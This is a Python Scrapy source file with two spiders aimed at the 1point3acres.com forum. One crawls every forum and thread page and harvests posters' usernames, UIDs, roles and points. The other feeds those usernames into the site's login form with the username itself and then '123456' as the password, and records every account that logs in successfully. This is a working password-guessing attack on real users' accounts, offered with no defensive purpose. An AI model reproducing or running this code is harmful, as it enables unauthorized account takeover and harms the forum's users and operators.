# -*- coding: utf-8 -*-
__author__ = 'zym'
from pointacre.items import LoginItem
from pointacre.items import UserItem
from pointacre.item_loader import UserLoader
from scrapy.spider import Spider
from scrapy.contrib.spiders import CrawlSpider,Rule
from scrapy.contrib.linkextractors.sgml import SgmlLinkExtractor
from scrapy.selector import Selector
from scrapy.http import Request, FormRequest
import re
import csv


def get_numbers(list):
    numbers=[]
    for elem in list:
        if elem.isnumeric():
            numbers.append(int(elem))
    return numbers


class UserSpider(CrawlSpider):
    name="1point3acres.user"
    allowed_domains=['1point3acres.com']
    start_urls=["http://www.1point3acres.com/bbs/"]
    rules = [Rule(SgmlLinkExtractor(allow=['forum-\d+-\d+\.html']),callback='generate_forum_pages')]

    def generate_forum_pages(self, response):
        requests=[]
        forum_id=re.search(r'http://www.1point3acres.com/bbs/forum-(\d+)',response.url).group(1)
        start_page,end_page=self.get_page_numbers(response)
        for i in range(start_page,end_page+1):
            url="http://www.1point3acres.com/bbs/forum-"+str(forum_id)+"-"+str(i)+".html"
            r=Request(url=url,callback=self.parse_forum,dont_filter=True)
            requests.append(r)
        return requests

    def parse_forum(self,response):
        requests=[]
        selector=Selector(response)
        topic_link_xpath='//form[@id="moderate"]/table//tbody//th/a[@class="xst"]/@href'
        urls=selector.xpath(topic_link_xpath).extract()
        for url in urls:
            r=Request(url=url,callback=self.generate_topic_pages)
            requests.append(r)
        return requests


    def generate_topic_pages(self,response):
        requests=[]
        topic_id=re.search(r'http://www.1point3acres.com/bbs/thread-(\d+)',response.url).group(1)
        start_page,end_page=self.get_page_numbers(response)
        for i in range(start_page,end_page+1):
            url="http://www.1point3acres.com/bbs/thread-"+str(topic_id)+"-"+str(i)+"-1.html"
            r=Request(url=url,callback=self.parse_topic,dont_filter=True)
            requests.append(r)
        return requests

    def parse_topic(self,response):
        items=[]
        print "Topic page:%s" % response.url
        selector=Selector(response)
        name_xpath='//div[@id="postlist"]//table//div[@class="authi"]/a[@class="xi2"]/text()'
        role_xpath='//div[@id="postlist"]//table//td[@class="pls"]/div/p//em//text()'
        other_xpath='//div[@id="postlist"]//table//td[@class="pls"]/dl[@class="pil cl"]//dd/text()'
        names=selector.xpath(name_xpath).extract()
        roles=selector.xpath(role_xpath).extract()
        others=selector.xpath(other_xpath).extract()
        user_count=len(names)
        for i in range(user_count):
            loader=UserLoader(UserItem())
            loader.add_value('username',names[i])
            loader.add_value('role',roles[i])
            loader.add_value('gradepoint',others[i*4])
            loader.add_value('permission',others[i*4+1])
            loader.add_value('credit',others[i*4+2])
            loader.add_value('uid',others[i*4+3])
            item=loader.load_item()
            items.append(item)
        return items

    def get_page_numbers(self,response):
        start_page=1
        end_page=1
        selector=Selector(response)
        xpath_last='//div[@class="pg"][1]//a[@class="last"]/text()'
        last_page_content=selector.xpath(xpath_last).extract()
        if len(last_page_content)>0:
            end_page=int(re.search(u'\d+',last_page_content[0]).group())
        else:
            xpath_all='//div[@class="pg"][1]//a/text()'
            page_numbers=get_numbers(selector.xpath(xpath_all).extract())
            if len(page_numbers)>0:
                end_page=max(page_numbers)
        return start_page,end_page


class LoginSpider(Spider):
    name="1point3acres.login"
    start_urls=["http://1point3acres.com/bbs"]
    def __init__(self):
        reader=csv.reader(file(r'D:\PythonWorkspace\PythonCrawler\pointacre\usernames.csv','rb'))
        self.usernames=[]
        for line in reader:
            self.usernames.append(line[0])
    def parse(self, response):
        request_url="http://1point3acres.com/bbs/member.php?mod=logging&action=login&loginsubmit=yes&infloat=yes&lssubmit=yes&inajax=1"
        request=[]
        for username in self.usernames:
            print "Username:%s" % username
            data={}
            data['username']=username
            data['password']=username
            r=FormRequest(url=request_url,formdata=data,callback=self.after_login)
            request.append(r)
            data={}
            data['username']=username
            data['password']="123456"
            r=FormRequest(url=request_url,formdata=data,callback=self.after_login)
            request.append(r)
        # r=FormRequest(url=request_url,formdata={'username':'zym242','password':'zym242'},callback=self.after_login)
        # request.append(r)
        return request

    def after_login(self,response):
        # check login succeed before going on
        message=response.body
        if re.search(u"登录失败".encode('gbk'),message):
            print "%s" % "failed"
        elif re.search(u"密码错误".encode('gbk'),message):
            print "%s" % "too many times"
        else:
            print "%s" % "*********succeed*********"
            username=re.search(ur"'username':'(\w+)'",message,re.I).group(1)
            print "Username:%s" % username
            item=LoginItem()
            item['username']=username
            return item
